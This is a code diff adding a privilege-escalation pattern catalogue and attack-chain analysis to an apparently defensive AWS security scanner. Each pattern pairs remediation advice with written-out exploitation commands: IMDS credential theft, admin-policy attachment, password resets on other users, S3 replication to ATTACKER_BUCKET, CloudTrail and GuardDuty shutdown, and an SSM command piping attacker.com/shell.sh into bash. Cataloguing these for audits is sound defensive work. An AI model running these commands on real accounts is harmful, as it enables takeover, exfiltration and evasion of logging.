-    output += `| Lambda backdoor | lambda:CreateFunction, iam:PassRole | HIGH |\n`;
-    output += `| Policy attachment | iam:AttachUserPolicy | CRITICAL |\n`;
-    output += `| Access key creation | iam:CreateAccessKey | HIGH |\n`;
-    output += `| CloudFormation stack | cloudformation:* | CRITICAL |\n`;
-
-  } catch (error: any) {
-    output += `[FAIL] Error: ${error.message}\n`;
-  }
-
-  return output;
-}
-
-/**
  * Scan AWS Systems Manager security
  */
 async function scanSSMSecurity(region: string): Promise<string> {
@@ -5309,6 +4716,1249 @@ async function scanSSMSecurity(region: string): Promise<string> {
   }
 
   return output;
+}
+
+// ============================================================================
+// ATTACK CHAIN BUILDER & ADVANCED PRIVILEGE ESCALATION ANALYSIS
+// Based on Heimdall patterns and Rhino Security Labs research
+// ============================================================================
+
+interface PrivescPattern {
+  id: string;
+  name: string;
+  description: string;
+  requiredActions: string[];
+  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
+  mitreTechnique: string;
+  mitreId: string;
+  category: string;
+  exploitation: string;
+  remediation: string;
+}
+
+interface AttackChainStep {
+  stepNumber: number;
+  action: string;
+  target: string;
+  technique: string;
+  mitreId: string;
+  command: string;
+}
+
+interface AttackChain {
+  chainId: string;
+  name: string;
+  description: string;
+  initialPrincipal: string;
+  finalTarget: string;
+  blastRadius: number;
+  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
+  steps: AttackChainStep[];
+  mitreMapping: string[];
+}
+
+// 50+ Privilege Escalation Patterns (Rhino Security Labs + Heimdall)
+const PRIVESC_PATTERNS: PrivescPattern[] = [
+  // === PASSROLE ABUSE PATTERNS ===
+  {
+    id: 'passrole-lambda',
+    name: 'PassRole to Lambda',
+    description: 'Create Lambda with high-privilege role and invoke to execute code',
+    requiredActions: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Privilege Escalation via Lambda',
+    mitreId: 'T1078.004',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.Service,'lambda.amazonaws.com')]"
+2. aws lambda create-function --function-name privesc --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/TARGET_ROLE --handler index.handler --zip-file fileb://malicious.zip
+3. aws lambda invoke --function-name privesc output.txt`,
+    remediation: 'Add iam:PassRole condition to restrict which roles can be passed'
+  },
+  {
+    id: 'passrole-ec2',
+    name: 'PassRole to EC2',
+    description: 'Launch EC2 with high-privilege instance profile for credential theft',
+    requiredActions: ['iam:PassRole', 'ec2:RunInstances'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Privilege Escalation via EC2',
+    mitreId: 'T1078.004',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws iam list-instance-profiles
+2. aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --iam-instance-profile Name=TARGET_PROFILE
+3. SSH to instance, curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
+    remediation: 'Restrict iam:PassRole with resource conditions'
+  },
+  {
+    id: 'passrole-glue',
+    name: 'PassRole to Glue',
+    description: 'Create Glue job with privileged role to execute arbitrary code',
+    requiredActions: ['iam:PassRole', 'glue:CreateJob', 'glue:StartJobRun'],
+    severity: 'HIGH',
+    mitreTechnique: 'Execution via Glue',
+    mitreId: 'T1059',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws glue create-job --name privesc-job --role arn:aws:iam::ACCOUNT:role/GlueRole --command Name=pythonshell,ScriptLocation=s3://bucket/malicious.py
+2. aws glue start-job-run --job-name privesc-job`,
+    remediation: 'Restrict Glue roles and S3 script locations'
+  },
+  {
+    id: 'passrole-cloudformation',
+    name: 'PassRole to CloudFormation',
+    description: 'Create stack with privileged role to provision resources',
+    requiredActions: ['iam:PassRole', 'cloudformation:CreateStack'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Infrastructure Modification',
+    mitreId: 'T1578',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. Create template with IAM::User or Lambda resources
+2. aws cloudformation create-stack --stack-name privesc --template-body file://template.yaml --role-arn arn:aws:iam::ACCOUNT:role/CFNRole --capabilities CAPABILITY_IAM`,
+    remediation: 'Use CloudFormation StackSets with restricted permissions'
+  },
+  {
+    id: 'passrole-codebuild',
+    name: 'PassRole to CodeBuild',
+    description: 'Create CodeBuild project with privileged role for RCE',
+    requiredActions: ['iam:PassRole', 'codebuild:CreateProject', 'codebuild:StartBuild'],
+    severity: 'HIGH',
+    mitreTechnique: 'Execution via CodeBuild',
+    mitreId: 'T1059',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws codebuild create-project --name privesc --source type=NO_SOURCE,buildspec="..." --service-role arn:aws:iam::ACCOUNT:role/CodeBuildRole
+2. aws codebuild start-build --project-name privesc`,
+    remediation: 'Restrict CodeBuild roles and source locations'
+  },
+  {
+    id: 'passrole-sagemaker',
+    name: 'PassRole to SageMaker',
+    description: 'Create SageMaker notebook with privileged execution role',
+    requiredActions: ['iam:PassRole', 'sagemaker:CreateNotebookInstance'],
+    severity: 'HIGH',
+    mitreTechnique: 'Execution via SageMaker',
+    mitreId: 'T1059',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws sagemaker create-notebook-instance --notebook-instance-name privesc --instance-type ml.t2.medium --role-arn arn:aws:iam::ACCOUNT:role/SageMakerRole
+2. Access Jupyter notebook via presigned URL`,
+    remediation: 'Restrict SageMaker roles and network access'
+  },
+  {
+    id: 'passrole-ecs',
+    name: 'PassRole to ECS Task',
+    description: 'Run ECS task with privileged task role',
+    requiredActions: ['iam:PassRole', 'ecs:RegisterTaskDefinition', 'ecs:RunTask'],
+    severity: 'HIGH',
+    mitreTechnique: 'Execution via Containers',
+    mitreId: 'T1610',
+    category: 'PASSROLE_EXECUTION',
+    exploitation: `
+1. aws ecs register-task-definition --family privesc --task-role-arn arn:aws:iam::ACCOUNT:role/ECSTaskRole --container-definitions [...]
+2. aws ecs run-task --cluster default --task-definition privesc`,
+    remediation: 'Restrict ECS task roles and cluster access'
+  },
+  // === POLICY MANIPULATION PATTERNS ===
+  {
+    id: 'attach-admin-policy',
+    name: 'Attach Administrator Policy',
+    description: 'Attach AdministratorAccess policy to self',
+    requiredActions: ['iam:AttachUserPolicy'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `aws iam attach-user-policy --user-name CURRENT_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
+    remediation: 'Use SCPs to deny AttachUserPolicy for admin policies'
+  },
+  {
+    id: 'attach-role-policy',
+    name: 'Attach Policy to Role',
+    description: 'Attach powerful policy to assumable role',
+    requiredActions: ['iam:AttachRolePolicy', 'sts:AssumeRole'],
+    severity: 'HIGH',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `
+1. aws iam attach-role-policy --role-name TARGET_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+2. aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE --role-session-name privesc`,
+    remediation: 'Restrict AttachRolePolicy with conditions'
+  },
+  {
+    id: 'put-user-policy',
+    name: 'Create Inline User Policy',
+    description: 'Add inline policy with elevated permissions',
+    requiredActions: ['iam:PutUserPolicy'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `aws iam put-user-policy --user-name CURRENT_USER --policy-name AdminAccess --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'`,
+    remediation: 'Deny PutUserPolicy via SCP'
+  },
+  {
+    id: 'put-role-policy',
+    name: 'Create Inline Role Policy',
+    description: 'Add inline policy to assumable role',
+    requiredActions: ['iam:PutRolePolicy', 'sts:AssumeRole'],
+    severity: 'HIGH',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `
+1. aws iam put-role-policy --role-name TARGET_ROLE --policy-name AdminAccess --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+2. aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE --role-session-name privesc`,
+    remediation: 'Restrict PutRolePolicy with conditions'
+  },
+  {
+    id: 'create-policy-version',
+    name: 'Create Policy Version',
+    description: 'Create new default policy version with elevated permissions',
+    requiredActions: ['iam:CreatePolicyVersion'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MY_POLICY --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default`,
+    remediation: 'Deny CreatePolicyVersion via SCP'
+  },
+  {
+    id: 'set-default-policy-version',
+    name: 'Set Default Policy Version',
+    description: 'Change default policy version to one with elevated permissions',
+    requiredActions: ['iam:SetDefaultPolicyVersion'],
+    severity: 'HIGH',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'POLICY_MANIPULATION',
+    exploitation: `aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MY_POLICY --version-id v2`,
+    remediation: 'Deny SetDefaultPolicyVersion via SCP'
+  },
+  // === CREDENTIAL ACCESS PATTERNS ===
+  {
+    id: 'create-access-key',
+    name: 'Create Access Key',
+    description: 'Create access key for another user',
+    requiredActions: ['iam:CreateAccessKey'],
+    severity: 'HIGH',
+    mitreTechnique: 'Valid Accounts: Cloud',
+    mitreId: 'T1078.004',
+    category: 'CREDENTIAL_ACCESS',
+    exploitation: `aws iam create-access-key --user-name ADMIN_USER`,
+    remediation: 'Restrict CreateAccessKey to self only'
+  },
+  {
+    id: 'create-login-profile',
+    name: 'Create Login Profile',
+    description: 'Create console password for another user',
+    requiredActions: ['iam:CreateLoginProfile'],
+    severity: 'HIGH',
+    mitreTechnique: 'Valid Accounts: Cloud',
+    mitreId: 'T1078.004',
+    category: 'CREDENTIAL_ACCESS',
+    exploitation: `aws iam create-login-profile --user-name ADMIN_USER --password MyP@ssw0rd! --no-password-reset-required`,
+    remediation: 'Restrict CreateLoginProfile to self only'
+  },
+  {
+    id: 'update-login-profile',
+    name: 'Update Login Profile',
+    description: 'Reset password for another user',
+    requiredActions: ['iam:UpdateLoginProfile'],
+    severity: 'HIGH',
+    mitreTechnique: 'Valid Accounts: Cloud',
+    mitreId: 'T1078.004',
+    category: 'CREDENTIAL_ACCESS',
+    exploitation: `aws iam update-login-profile --user-name ADMIN_USER --password NewP@ssw0rd!`,
+    remediation: 'Restrict UpdateLoginProfile to self only'
+  },
+  {
+    id: 'update-assume-role-policy',
+    name: 'Update Assume Role Policy',
+    description: 'Modify trust policy to allow self assumption',
+    requiredActions: ['iam:UpdateAssumeRolePolicy'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'CREDENTIAL_ACCESS',
+    exploitation: `aws iam update-assume-role-policy --role-name ADMIN_ROLE --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/ATTACKER"},"Action":"sts:AssumeRole"}]}'`,
+    remediation: 'Restrict UpdateAssumeRolePolicy via SCP'
+  },
+  // === EKS ABUSE PATTERNS ===
+  {
+    id: 'eks-irsa-abuse',
+    name: 'IRSA Pod Execution Abuse',
+    description: 'Exploit IRSA-enabled service account by scheduling malicious pod',
+    requiredActions: ['eks:DescribeCluster', 'eks:AccessKubernetesApi'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Container Administration Command',
+    mitreId: 'T1609',
+    category: 'EKS_ABUSE',
+    exploitation: `
+1. kubectl get serviceaccounts -A -o json | jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"])'
+2. Create pod with target serviceAccountName
+3. kubectl exec -it malicious-pod -- aws sts get-caller-identity`,
+    remediation: 'Use Pod Security Policies/Standards, restrict serviceAccountName'
+  },
+  {
+    id: 'eks-node-role-theft',
+    name: 'EKS Node Role Credential Theft',
+    description: 'Steal node IAM role credentials via IMDS from compromised pod',
+    requiredActions: [],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Unsecured Credentials',
+    mitreId: 'T1552',
+    category: 'EKS_ABUSE',
+    exploitation: `
+1. kubectl exec -it pod -- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+2. Get role name from response
+3. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
+    remediation: 'Use IMDSv2, restrict IMDS access in network policy'
+  },
+  {
+    id: 'eks-cluster-admin',
+    name: 'EKS Cluster Admin Access',
+    description: 'Use UpdateClusterConfig permission for cluster admin access',
+    requiredActions: ['eks:UpdateClusterConfig'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Account Manipulation',
+    mitreId: 'T1098',
+    category: 'EKS_ABUSE',
+    exploitation: `
+1. aws eks update-cluster-config --name CLUSTER --resources-vpc-config endpointPublicAccess=true
+2. Add self to aws-auth ConfigMap with system:masters group`,
+    remediation: 'Restrict UpdateClusterConfig, use private endpoint'
+  },
+  {
+    id: 'eks-create-fargate-profile',
+    name: 'EKS Fargate Profile PassRole',
+    description: 'Create Fargate profile to pass execution role',
+    requiredActions: ['iam:PassRole', 'eks:CreateFargateProfile'],
+    severity: 'HIGH',
+    mitreTechnique: 'Container Administration Command',
+    mitreId: 'T1609',
+    category: 'EKS_ABUSE',
+    exploitation: `
+1. aws eks create-fargate-profile --cluster-name CLUSTER --fargate-profile-name malicious --pod-execution-role-arn arn:aws:iam::ACCOUNT:role/PRIV_ROLE --selectors namespace=default
+2. Schedule pod in default namespace to get PRIV_ROLE credentials`,
+    remediation: 'Restrict Fargate profile creation, limit pod execution roles'
+  },
+  {
+    id: 'eks-describe-all',
+    name: 'EKS Wildcard Describe',
+    description: 'Enumerate all EKS clusters and configurations',
+    requiredActions: ['eks:Describe*', 'eks:List*'],
+    severity: 'MEDIUM',
+    mitreTechnique: 'Cloud Infrastructure Discovery',
+    mitreId: 'T1580',
+    category: 'EKS_ABUSE',
+    exploitation: `
+1. aws eks list-clusters
+2. aws eks describe-cluster --name CLUSTER
+3. aws eks list-nodegroups --cluster-name CLUSTER`,
+    remediation: 'Apply least privilege for EKS describe permissions'
+  },
+  // === LAMBDA ABUSE PATTERNS ===
+  {
+    id: 'lambda-update-code',
+    name: 'Update Lambda Code',
+    description: 'Modify existing Lambda function code to backdoor execution',
+    requiredActions: ['lambda:UpdateFunctionCode'],
+    severity: 'HIGH',
+    mitreTechnique: 'Server Software Component',
+    mitreId: 'T1505',
+    category: 'LAMBDA_ABUSE',
+    exploitation: `
+1. aws lambda list-functions --query "Functions[?Role contains 'admin']"
+2. aws lambda update-function-code --function-name TARGET_FN --zip-file fileb://backdoor.zip`,
+    remediation: 'Restrict UpdateFunctionCode, use code signing'
+  },
+  {
+    id: 'lambda-add-layer',
+    name: 'Add Malicious Lambda Layer',
+    description: 'Add layer with malicious code to existing function',
+    requiredActions: ['lambda:UpdateFunctionConfiguration', 'lambda:PublishLayerVersion'],
+    severity: 'HIGH',
+    mitreTechnique: 'Hijack Execution Flow',
+    mitreId: 'T1574',
+    category: 'LAMBDA_ABUSE',
+    exploitation: `
+1. aws lambda publish-layer-version --layer-name backdoor --zip-file fileb://layer.zip
+2. aws lambda update-function-configuration --function-name TARGET_FN --layers arn:aws:lambda:region:ACCOUNT:layer:backdoor:1`,
+    remediation: 'Restrict layer management, audit layer sources'
+  },
+  {
+    id: 'lambda-env-secrets',
+    name: 'Lambda Environment Variable Secrets',
+    description: 'Extract secrets from Lambda environment variables',
+    requiredActions: ['lambda:GetFunctionConfiguration'],
+    severity: 'MEDIUM',
+    mitreTechnique: 'Unsecured Credentials',
+    mitreId: 'T1552',
+    category: 'LAMBDA_ABUSE',
+    exploitation: `aws lambda get-function-configuration --function-name TARGET_FN --query "Environment.Variables"`,
+    remediation: 'Use Secrets Manager instead of env vars'
+  },
+  // === SSM ABUSE PATTERNS ===
+  {
+    id: 'ssm-run-command',
+    name: 'SSM Run Command',
+    description: 'Execute commands on EC2 instances via SSM',
+    requiredActions: ['ssm:SendCommand'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'System Services: Service Execution',
+    mitreId: 'T1569',
+    category: 'SSM_ABUSE',
+    exploitation: `aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters commands=["curl http://attacker.com/shell.sh | bash"]`,
+    remediation: 'Restrict SSM SendCommand with conditions'
+  },
+  {
+    id: 'ssm-start-session',
+    name: 'SSM Start Session',
+    description: 'Get shell access to EC2 via SSM Session Manager',
+    requiredActions: ['ssm:StartSession'],
+    severity: 'HIGH',
+    mitreTechnique: 'Remote Services',
+    mitreId: 'T1021',
+    category: 'SSM_ABUSE',
+    exploitation: `aws ssm start-session --target i-xxx`,
+    remediation: 'Restrict StartSession, enable session logging'
+  },
+  {
+    id: 'ssm-get-parameters',
+    name: 'SSM Parameter Store Secrets',
+    description: 'Extract secrets from SSM Parameter Store',
+    requiredActions: ['ssm:GetParameter', 'ssm:GetParameters'],
+    severity: 'HIGH',
+    mitreTechnique: 'Unsecured Credentials',
+    mitreId: 'T1552',
+    category: 'SSM_ABUSE',
+    exploitation: `
+1. aws ssm describe-parameters --query "Parameters[?contains(Name,'secret') || contains(Name,'password') || contains(Name,'key')]"
+2. aws ssm get-parameter --name /secrets/db-password --with-decryption`,
+    remediation: 'Restrict parameter access by path'
+  },
+  // === S3 ABUSE PATTERNS ===
+  {
+    id: 's3-data-exfil',
+    name: 'S3 Data Exfiltration',
+    description: 'Replicate or copy data to external bucket',
+    requiredActions: ['s3:PutReplicationConfiguration'],
+    severity: 'HIGH',
+    mitreTechnique: 'Transfer Data to Cloud Account',
+    mitreId: 'T1537',
+    category: 'S3_ABUSE',
+    exploitation: `aws s3api put-bucket-replication --bucket SOURCE_BUCKET --replication-configuration '{"Role":"arn:aws:iam::ACCOUNT:role/replication","Rules":[{"Status":"Enabled","Destination":{"Bucket":"arn:aws:s3:::ATTACKER_BUCKET"}}]}'`,
+    remediation: 'Restrict PutReplicationConfiguration, monitor replication rules'
+  },
+  {
+    id: 's3-bucket-policy',
+    name: 'Modify S3 Bucket Policy',
+    description: 'Add permissive bucket policy for data access',
+    requiredActions: ['s3:PutBucketPolicy'],
+    severity: 'HIGH',
+    mitreTechnique: 'Data Manipulation',
+    mitreId: 'T1565',
+    category: 'S3_ABUSE',
+    exploitation: `aws s3api put-bucket-policy --bucket TARGET_BUCKET --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::TARGET_BUCKET/*"}]}'`,
+    remediation: 'Use S3 Block Public Access, restrict PutBucketPolicy'
+  },
+  // === SECRETS MANAGER ABUSE ===
+  {
+    id: 'secrets-manager-get',
+    name: 'Get Secret Value',
+    description: 'Retrieve secrets from Secrets Manager',
+    requiredActions: ['secretsmanager:GetSecretValue'],
+    severity: 'HIGH',
+    mitreTechnique: 'Unsecured Credentials',
+    mitreId: 'T1552',
+    category: 'SECRETS_ACCESS',
+    exploitation: `
+1. aws secretsmanager list-secrets
+2. aws secretsmanager get-secret-value --secret-id prod/database/credentials`,
+    remediation: 'Restrict secret access by resource ARN'
+  },
+  // === CLOUDTRAIL EVASION ===
+  {
+    id: 'cloudtrail-stop',
+    name: 'Stop CloudTrail Logging',
+    description: 'Disable CloudTrail to evade detection',
+    requiredActions: ['cloudtrail:StopLogging'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Impair Defenses',
+    mitreId: 'T1562',
+    category: 'DEFENSE_EVASION',
+    exploitation: `aws cloudtrail stop-logging --name my-trail`,
+    remediation: 'Use SCP to deny StopLogging'
+  },
+  {
+    id: 'cloudtrail-delete',
+    name: 'Delete CloudTrail',
+    description: 'Delete CloudTrail trail to remove logging',
+    requiredActions: ['cloudtrail:DeleteTrail'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Impair Defenses',
+    mitreId: 'T1562',
+    category: 'DEFENSE_EVASION',
+    exploitation: `aws cloudtrail delete-trail --name my-trail`,
+    remediation: 'Use SCP to deny DeleteTrail'
+  },
+  {
+    id: 'guardduty-disable',
+    name: 'Disable GuardDuty',
+    description: 'Disable GuardDuty threat detection',
+    requiredActions: ['guardduty:DeleteDetector'],
+    severity: 'CRITICAL',
+    mitreTechnique: 'Impair Defenses',
+    mitreId: 'T1562',
+    category: 'DEFENSE_EVASION',
+    exploitation: `aws guardduty delete-detector --detector-id xxx`,
+    remediation: 'Use SCP to deny DeleteDetector'
+  },
+];
+
+const ATTACK_CHAIN_TEMPLATES: { 
+  name: string; 
+  description: string;
+  steps: { action: string; target: string; technique: string; mitreId: string }[];
+  requiredPermissions: string[];
+}[] = [
+  {
+    name: 'PassRole → Lambda → Secrets',
+    description: 'Create Lambda with privileged role to access Secrets Manager',
+    steps: [
+      { action: 'iam:PassRole', target: 'Lambda service', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
+      { action: 'lambda:CreateFunction', target: 'New Lambda function', technique: 'Execution', mitreId: 'T1059' },
+      { action: 'lambda:InvokeFunction', target: 'Lambda execution', technique: 'Execution', mitreId: 'T1059' },
+      { action: 'secretsmanager:GetSecretValue', target: 'Secrets', technique: 'Credential Access', mitreId: 'T1552' },
+    ],
+    requiredPermissions: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
+  },
+  {
+    name: 'PassRole → EC2 → IMDS → Secrets',
+    description: 'Launch EC2 with privileged role, steal credentials via IMDS',
+    steps: [
+      { action: 'iam:PassRole', target: 'EC2 service', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
+      { action: 'ec2:RunInstances', target: 'New EC2 instance', technique: 'Execution', mitreId: 'T1059' },
+      { action: 'IMDS Query', target: 'Instance metadata', technique: 'Credential Access', mitreId: 'T1552' },
+      { action: 'sts:AssumeRole', target: 'High privilege role', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
+    ],
+    requiredPermissions: ['iam:PassRole', 'ec2:RunInstances'],
+  },
+  {
+    name: 'AttachPolicy → AssumeRole → Admin',
+    description: 'Attach admin policy to role, then assume it',
+    steps: [
+      { action: 'iam:AttachRolePolicy', target: 'Target role', technique: 'Persistence', mitreId: 'T1098' },
+      { action: 'sts:AssumeRole', target: 'Modified role', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
+      { action: 'iam:*', target: 'Full IAM access', technique: 'Privilege Escalation', mitreId: 'T1078.004' },
+    ],
+    requiredPermissions: ['iam:AttachRolePolicy', 'sts:AssumeRole'],
+  },
+  {
+    name: 'SSM → EC2 → Pivot',
+    description: 'Use SSM to execute commands on EC2 for lateral movement',
+    steps: [
+      { action: 'ssm:SendCommand', target: 'EC2 instance', technique: 'Execution', mitreId: 'T1569' },
+      { action: 'Shell access', target: 'Instance OS', technique: 'Lateral Movement', mitreId: 'T1021' },
+      { action: 'IMDS/creds', target: 'Instance role', technique: 'Credential Access', mitreId: 'T1552' },
+      { action: 'Pivot to AWS', target: 'AWS API', technique: 'Lateral Movement', mitreId: 'T1021' },
+    ],
+    requiredPermissions: ['ssm:SendCommand'],
+  },
+  {
+    name: 'EKS IRSA → AWS API',
+    description: 'Abuse IRSA to get AWS credentials from Kubernetes pod',
+    steps: [
+      { action: 'eks:DescribeCluster', target: 'EKS cluster', technique: 'Discovery', mitreId: 'T1580' },
+      { action: 'kubectl apply', target: 'Malicious pod', technique: 'Execution', mitreId: 'T1609' },
+      { action: 'IRSA credentials', target: 'Pod IAM role', technique: 'Credential Access', mitreId: 'T1552' },
+      { action: 'AWS API calls', target: 'AWS resources', technique: 'Impact', mitreId: 'T1565' },
+    ],
+    requiredPermissions: ['eks:DescribeCluster', 'eks:AccessKubernetesApi'],
+  },
+  {
+    name: 'Lambda Layer Backdoor',
+    description: 'Add malicious layer to existing Lambda for persistence',
+    steps: [
+      { action: 'lambda:PublishLayerVersion', target: 'New layer', technique: 'Persistence', mitreId: 'T1505' },
+      { action: 'lambda:UpdateFunctionConfiguration', target: 'Existing Lambda', technique: 'Persistence', mitreId: 'T1574' },
+      { action: 'Lambda invocation', target: 'Backdoor execution', technique: 'Execution', mitreId: 'T1059' },
+    ],
+    requiredPermissions: ['lambda:PublishLayerVersion', 'lambda:UpdateFunctionConfiguration'],
+  },
+];
+
+/**
+ * Calculate blast radius score (0-100) based on compromised resources
+ */
+function calculateBlastRadius(permissions: string[], services: string[], resourceCount: number): number {
+  let score = 0;
+  
+  // Admin/wildcard permissions are critical
+  const adminPermissions = permissions.filter(p => 
+    p.includes(':*') || p === '*' || p.includes('Administrator')
+  );
+  score += adminPermissions.length * 20;
+  
+  // High-value services
+  const highValueServices = ['iam', 's3', 'secretsmanager', 'kms', 'ec2', 'lambda', 'rds'];
+  const affectedHighValue = services.filter(s => highValueServices.includes(s.toLowerCase()));
+  score += affectedHighValue.length * 10;
+  
+  // Resource count factor
+  score += Math.min(resourceCount * 2, 30);
+  
+  // Cross-account capability
+  if (permissions.some(p => p.includes('sts:AssumeRole'))) {
+    score += 15;
+  }
+  
+  // Data access
+  if (permissions.some(p => p.includes('s3:Get') || p.includes('secretsmanager:Get'))) {
+    score += 10;
+  }
+  
+  return Math.min(score, 100);
+}
+
+/**
+ * Build attack chains from IAM findings
+ */
+async function buildAttackChains(region: string = 'us-east-1', principalArn?: string, minSeverity: string = 'HIGH'): Promise<string> {
+  let output = `# 🔗 Attack Chain Analysis\n\n`;
+  output += `**Region:** ${region}\n`;
+  output += `**Target Principal:** ${principalArn || 'All principals'}\n`;
+  output += `**Minimum Severity:** ${minSeverity}\n\n`;
+  
+  const chains: AttackChain[] = [];
+  const severityOrder = { 'LOW': 0, 'MEDIUM': 1, 'HIGH': 2, 'CRITICAL': 3 };
+  const minSeverityNum = severityOrder[minSeverity as keyof typeof severityOrder] || 2;
+  
+  try {
+    // Get all IAM users and roles
+    const usersCmd = new ListUsersCommand({});
+    const users = await iamClient.send(usersCmd);
+    
+    const rolesCmd = new ListRolesCommand({});
+    const roles = await iamClient.send(rolesCmd);
+    
+    const principals: { arn: string; type: 'User' | 'Role'; name: string }[] = [];
+    
+    for (const user of users.Users || []) {
+      if (!principalArn || user.Arn === principalArn) {
+        principals.push({ arn: user.Arn!, type: 'User', name: user.UserName! });
+      }
+    }
+    
+    for (const role of roles.Roles || []) {
+      if (!principalArn || role.Arn === principalArn) {
+        // Skip AWS service roles
+        if (!role.Arn?.includes('aws-service-role')) {
+          principals.push({ arn: role.Arn!, type: 'Role', name: role.RoleName! });
+        }
+      }
+    }
+    
+    output += `## 📊 Analysis Scope\n\n`;
+    output += `- **Users analyzed:** ${principals.filter(p => p.type === 'User').length}\n`;
+    output += `- **Roles analyzed:** ${principals.filter(p => p.type === 'Role').length}\n\n`;
+    
+    // Analyze each principal for attack chains
+    for (const principal of principals.slice(0, 20)) { // Limit for performance
+      const permissions = await getPrincipalEffectivePermissions(principal.arn, principal.type);
+      
+      // Check for each attack chain template
+      for (const template of ATTACK_CHAIN_TEMPLATES) {
+        const hasRequired = template.requiredPermissions.every(perm => 
+          permissions.some(p => matchesPermission(p, perm))
+        );
+        
+        if (hasRequired) {
+          const affectedServices = [...new Set(template.requiredPermissions.map(p => p.split(':')[0]))];
+          const blastRadius = calculateBlastRadius(permissions, affectedServices, 10);
+          
+          const severity = blastRadius >= 80 ? 'CRITICAL' : 
+                          blastRadius >= 60 ? 'HIGH' : 
+                          blastRadius >= 40 ? 'MEDIUM' : 'LOW';
+          
+          if (severityOrder[severity] >= minSeverityNum) {
+            chains.push({
+              chainId: `chain-${chains.length + 1}`,
+              name: template.name,
+              description: template.description,
+              initialPrincipal: principal.arn,
+              finalTarget: template.steps[template.steps.length - 1].target,
+              blastRadius,
+              severity,
+              steps: template.steps.map((step, idx) => ({
+                stepNumber: idx + 1,
+                action: step.action,
+                target: step.target,
+                technique: step.technique,
+                mitreId: step.mitreId,
+                command: `# ${step.action} → ${step.target}`,
+              })),
+              mitreMapping: [...new Set(template.steps.map(s => s.mitreId))],
+            });
+          }
+        }
+      }
+    }
+    
+    // Sort by blast radius
+    chains.sort((a, b) => b.blastRadius - a.blastRadius);
+    
+    // Output results
+    if (chains.length === 0) {
+      output += `## ✅ No Attack Chains Found\n\n`;
+      output += `No multi-step attack paths were identified for the analyzed principals.\n`;
+    } else {
+      output += `## 🚨 Attack Chains Identified: ${chains.length}\n\n`;
+      
+      // Summary table
+      output += `| Chain | Principal | Blast Radius | Severity |\n`;
+      output += `|-------|-----------|--------------|----------|\n`;
+      for (const chain of chains.slice(0, 10)) {
+        const principalName = chain.initialPrincipal.split('/').pop() || chain.initialPrincipal;
+        const severityIcon = chain.severity === 'CRITICAL' ? '🔴' : chain.severity === 'HIGH' ? '🟠' : '🟡';
+        output += `| ${chain.name} | ${principalName} | ${chain.blastRadius}/100 | ${severityIcon} ${chain.severity} |\n`;
+      }
+      output += `\n`;
+      
+      // Detailed chain analysis
+      for (const chain of chains.slice(0, 5)) {
+        output += `---\n\n`;
+        output += `### ${chain.severity === 'CRITICAL' ? '🔴' : '🟠'} ${chain.name}\n\n`;
+        output += `**Principal:** \`${chain.initialPrincipal}\`\n`;
